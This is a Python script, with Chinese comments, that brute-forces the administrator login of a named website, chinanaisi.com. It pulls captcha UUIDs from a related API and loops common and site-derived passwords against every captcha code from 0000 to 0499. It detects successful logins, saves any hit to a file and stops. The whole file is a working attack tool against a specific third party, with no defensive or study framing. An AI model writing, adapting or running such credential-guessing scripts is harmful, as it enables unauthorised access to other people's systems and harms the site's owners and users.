import subprocess, json, time, sys

PASSWORDS = ['admin','admin123','admin888','123456','chinanaisi','naisi','chinanaisi.com','admin001','root']
CODES_PER_ROUND = 500

for pwd in PASSWORDS:
    # 取新UUID
    try:
        r = subprocess.run(['curl','-sk','--connect-timeout','8','--max-time','10',
            'https://api.myxypt.com/captcha?width=140&height=48',
            '-c','/tmp/cn_cookie.txt','-b','/tmp/cn_cookie.txt'],
            capture_output=True, text=True, timeout=12)
        d = json.loads(r.stdout)
        uid = d['data']['uuid']
    except Exception as e:
        print(f'取UUID失败: {e}', flush=True)
        time.sleep(2)
        continue
    
    print(f'\n=== 密码={pwd} UID={uid[:8]}... ===', flush=True)
    
    for i in range(CODES_PER_ROUND):
        cv = f'{i:04d}'
        try:
            r2 = subprocess.run(['curl','-sk','--connect-timeout','2','--max-time','5','-L',
                'http://chinanaisi.com/admin/login.php','-X','POST',
                '-d', f'action=loginpost&uuid={uid}&loginId=&username=admin&password={pwd}&checkcode={cv}',
                '-b','/tmp/cn_cookie.txt'],
                capture_output=True, text=True, timeout=7)
            b = r2.stdout[:200]
            # 检查成功标志
            if 'parent.location' in b or 'top.location' in b or '管理中心' in b or 'dashboard' in b.lower() or ('后台' in b and '登录' not in b and '验证码' not in b):
                print(f'!!!HIT!!! code={cv} password={pwd} uid={uid}', flush=True)
                open('/tmp/CN_HIT.txt','w').write(f'code={cv} password={pwd} uid={uid}\n{b[:2000]}')
                sys.exit(0)
            # 密码错误但验证码正确
            if ('密码' in b or 'password' in b.lower() or '用户名' in b) and '验证码' not in b:
                print(f'CODE_OK:{cv} but pw wrong ({pwd}) - resp:{b[:100]}', flush=True)
        except:
            pass
        
        if i % 100 == 0 and i > 0:
            print(f'  [{pwd} {i}/{CODES_PER_ROUND}]', flush=True)
    
    print(f'  {pwd}: {CODES_PER_ROUND}/{CODES_PER_ROUND} done', flush=True)

print('\n全部密码试完，没进去', flush=True)
